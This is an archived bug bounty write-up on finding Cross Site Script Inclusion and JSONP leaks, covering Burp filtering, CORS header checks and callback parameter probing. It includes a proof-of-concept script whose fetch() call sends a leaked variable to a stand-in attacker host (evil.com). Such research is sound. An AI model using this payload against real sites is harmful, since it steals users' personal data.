---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-27_effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty.md
original_filename: 2019-12-27_effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty.md
title: Effortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty
category: documents
detected_topics:
- access-control
- xss
- command-injection
- otp
- automation-abuse
- cors
tags:
- imported
- documents
- access-control
- xss
- command-injection
- otp
- automation-abuse
- cors
language: en
raw_sha256: 3842d31af9c9752d02090bb4a7516dd76716e3faa99532c2ab8e1b281ac8dc0c
text_sha256: 10c2ff3f198c297945cdc1c83fabf3e73a612a5a9db18cc1917e138d44411e80
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Effortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-27_effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty.md
- Source Type: markdown
- Detected Topics: access-control, xss, command-injection, otp, automation-abuse, cors
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `3842d31af9c9752d02090bb4a7516dd76716e3faa99532c2ab8e1b281ac8dc0c`
- Text SHA256: `10c2ff3f198c297945cdc1c83fabf3e73a612a5a9db18cc1917e138d44411e80`


## Content

---
title: "Effortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty"
url: "https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a"
authors: ["Omkar Bhagwat (@th3_hidd3n_mist)"]
bugs: ["XSSI"]
publication_date: "2019-12-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4859
scraped_via: "browseros"
---

# Effortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty

Effortlessly finding Cross Site Script Inclusion (XSSI) & JSONP for bug bounty
Omkar Bhagwat (th3_hidd3n_mist)
Follow
2 min read
·
Dec 27, 2019

379

I’ve moved my blog to https://th3hidd3nmist.github.io/

Hey everyone, I recently reported a dupe for a XSSI bug on a private program which paid out $̶3̶0̶0̶ ($800 Updated 13 Feb 2020) to the original reporter. I b̶e̶l̶i̶e̶v̶e̶ ̶t̶h̶e̶ ̶r̶e̶p̶o̶r̶t̶e̶r̶ ̶i̶s̶ ̶u̶n̶d̶e̶r̶p̶a̶i̶d̶ ̶s̶i̶n̶c̶e̶ ̶s̶e̶r̶i̶o̶u̶s̶ ̶i̶n̶f̶o̶r̶m̶a̶t̶i̶o̶n̶ ̶w̶a̶s̶ ̶l̶e̶a̶k̶e̶d̶ ̶¯̶\̶_̶(̶ツ̶)̶_̶/̶¯̶,̶ ̶&̶ decided to share the methodology I follow.

tl;dr (also read important notes at the bottom)

Press enter or click to view image in full size
Cheat sheet or something idk lol

Good reads, in case you’re new to XSSI/JSONP:
XSSI: https://www.scip.ch/en/?labs.20160414
JSONP: https://www.sjoerdlangkemper.nl/2019/01/02/jsonp

My Methodology:

After spidering the website (manual & automated), I filtered the results in Burp suite by MIME type, then skim through the responses of type “script” for sensitive information.
Press enter or click to view image in full size
Filtering by MIME type
I found a JS file which includes all the information that I filled in when signing up for an insurance policy. This included SSN, limited medical history, visa info, name, phone number, DOB, address etc. Yikes.
I look at the HTTP GET request for the JS file to make sure that it doesn’t require CORS triggering headers like:
Authorization, X-API-KEY, X-CSRF-TOKEN, X-whatever
At this stage if it does have CORS headers then, the attack will fail, unless I also find a CORS issue.

In this case, no special headers were needed, so I could include the JS file on a web page with a script tag and send it to any server leaking some serious PII, with the POC being similar to:

Get Omkar Bhagwat (th3_hidd3n_mist)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

<script src="https://target.com/vuln.js">
</script>
<script defer>
// var_name is a variable in vuln.js holding sensitive information
console.log(var_name);
// sending information to an attacker controlled server
fetch("https://evil.com/stealInfo?info="+var_name);
</script>

You can use the same way to find JSONP callbacks by appending parameters like callback=some_function, jsonp=blah on all paths that return sensitive information.

Important Notes:

Sometimes you’ll need multiple parameters to trigger a JSONP response. For example:
http://target.com?callback=test → no JSONP
http://target.com?type=jsonp&callback=test → returns JSONP
If the response has Content-Type: application/json but the body has JSONP/javascript, and the X-Content-Type-Options: nosniff header is NOT in the response, the exploit still WORKS.
For JSONP, different callback parameters might work on different endpoints even on the same website.
Example:
https://target.com/profile_info?callback=test→ no JSONP
https://target.com/profile_info?jsonp=test→ returns JSONP
But, on a different path on the same site:
https://target.com/account_info?jsonp=test→ no JSONP
https://target.com/account_info?jsoncallback=test→ returns JSONP

Feedback and constructive criticism are appreciated, thanks for reading!

Follow Infosec Write-ups for more such awesome write-ups.

InfoSec Write-ups
A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub…

medium.com
